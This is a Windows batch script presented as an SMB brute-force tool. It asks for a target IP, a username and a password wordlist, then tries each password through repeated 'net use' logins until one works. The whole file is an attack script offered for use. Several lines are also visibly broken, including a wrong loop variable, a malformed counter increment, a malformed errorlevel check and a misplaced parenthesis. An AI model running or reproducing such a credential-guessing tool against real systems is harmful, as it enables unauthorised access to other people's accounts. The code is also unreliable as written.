@echo off
title SMB Bruteforce - by Pranav
color A
echo.
set /p ip="Enter IP address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password word list: "

set /a count=0
for /f %%a in (%wordlist%) do 
(
	set pass=%%address
	call :attempt 
)
echo password not found  :(

:success
echo password found!: %pass%
net use \\%ip% /d /y >nul 2>&1
pause 
exit

:attempt
net use \\%ip%/user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+]
if %errorlevel equ 0 goto success